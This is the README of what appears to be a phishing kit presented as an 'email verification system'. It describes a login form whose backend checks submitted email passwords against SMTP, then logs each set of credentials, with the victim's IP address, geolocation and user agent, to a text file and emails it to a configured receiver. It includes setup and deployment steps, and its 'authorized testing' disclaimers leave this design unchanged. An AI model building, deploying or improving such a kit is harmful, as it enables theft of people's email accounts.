# Email Verification System

A secure PHP-based email credential validation system for authorized testing purposes.

## 🚀 Quick Start

1. **Setup Files**: All necessary files are included:
   - `index.html` - Main form interface
   - `process_login.php` - Backend processing script
   - `class.phpmailer.php` - PHPMailer fallback (for testing)
   - `config.php` - Configuration settings

2. **Configure Settings**: Edit `config.php` to update your SMTP settings:
   ```php
   define('RECEIVER_EMAIL', 'your-email@domain.com');
   define('SMTP_HOST', 'your-smtp-server.com');
   define('SMTP_USERNAME', 'your-smtp-username');
   define('SMTP_PASSWORD', 'your-smtp-password');
   ```

3. **Deploy**: Upload all files to your web server with PHP support.

4. **Access**: Open `index.html` in your web browser.

## 📁 File Structure

```
├── index.html              # Main HTML form
├── process_login.php       # PHP backend script
├── class.phpmailer.php     # PHPMailer fallback
├── config.php              # Configuration file
├── phpmailer_setup.php     # Setup helper script
└── README.md               # This file
```

## 🔧 Configuration

### Basic Settings (`config.php`)

- **RECEIVER_EMAIL**: Where notifications are sent
- **SMTP Settings**: Your SMTP server configuration
- **Rate Limiting**: Request throttling settings
- **Debug Mode**: Enable for development

### Security Features

- **Rate Limiting**: Prevents abuse with session-based throttling
- **Input Validation**: Email format and required field checking
- **CSRF Protection**: POST-only requests with proper headers
- **Error Handling**: Secure error messages without information disclosure

## 🛡️ Security Considerations

⚠️ **IMPORTANT**: This system is designed for authorized testing only.

### Production Deployment

1. **Install Official PHPMailer**:
   ```bash
   composer require phpmailer/phpmailer
   ```

2. **Secure Configuration**:
   - Move `config.php` outside web root
   - Use environment variables for sensitive data
   - Enable HTTPS/SSL
   - Implement proper logging and monitoring

3. **Server Configuration**:
   - Disable PHP error display in production
   - Set appropriate file permissions
   - Configure firewall rules

### Legal and Ethical Use

- Only use for authorized penetration testing
- Obtain proper written authorization
- Follow responsible disclosure practices
- Comply with local laws and regulations

## 🔍 Troubleshooting

### Common Issues

1. **PHPMailer Not Found**:
   - Install via Composer: `composer require phpmailer/phpmailer`
   - Or use the included fallback (testing only)

2. **Connection Failures**:
   - Check SMTP credentials in `config.php`
   - Verify firewall/network settings
   - Test SMTP server connectivity

3. **Permission Errors**:
   - Ensure PHP can write to log files
   - Check file permissions (644 for PHP files)

### Debug Mode

Enable debug mode in `config.php`:
```php
define('DEBUG_MODE', true);
```

This will show detailed error messages and PHP errors.

## 📊 Logging

The system logs all attempts to:
- **SS-Or.txt**: Local file log (if writable)
- **Email notifications**: Sent to configured receiver

Log entries include:
- Timestamp
- Email/credentials tested
- IP address and geolocation
- User agent information
- Success/failure status

## 🚀 Features

### Frontend (`index.html`)
- Modern, responsive design
- Real-time form validation
- Loading states and feedback
- Password visibility toggle
- Rate limiting feedback

### Backend (`process_login.php`)
- SMTP credential validation
- Geolocation tracking
- Email notifications
- File logging
- Rate limiting
- Error handling

### Security
- Input sanitization
- CSRF protection
- Rate limiting
- Secure error handling
- Session management

## 📝 API Response Format

The backend returns JSON responses:

```json
{
  "signal": "OK|not ok|error",
  "msg": "Response message"
}
```

### Response Types
- `"OK"`: Valid credentials
- `"not ok"`: Invalid credentials  
- `"error"`: System error or validation failure

## 🔄 Upgrading

### From Basic Setup to Production

1. **Install Dependencies**:
   ```bash
   composer init
   composer require phpmailer/phpmailer
   ```

2. **Update Includes** in `process_login.php`:
   ```php
   require_once 'vendor/autoload.php';
   use PHPMailer\PHPMailer\PHPMailer;
   ```

3. **Environment Variables**:
   ```bash
   export SMTP_HOST="your-server"
   export SMTP_USER="your-username"
   export SMTP_PASS="your-password"
   ```

## 📞 Support

For issues or questions:
1. Check the troubleshooting section
2. Enable debug mode for detailed errors
3. Review server error logs
4. Verify SMTP configuration

## ⚖️ License

This software is provided for educational and authorized testing purposes only. Users are responsible for ensuring compliance with applicable laws and regulations.

---

**⚠️ Disclaimer**: This tool is intended for authorized security testing only. Unauthorized use may violate laws and regulations. Always obtain proper permission before testing systems you do not own.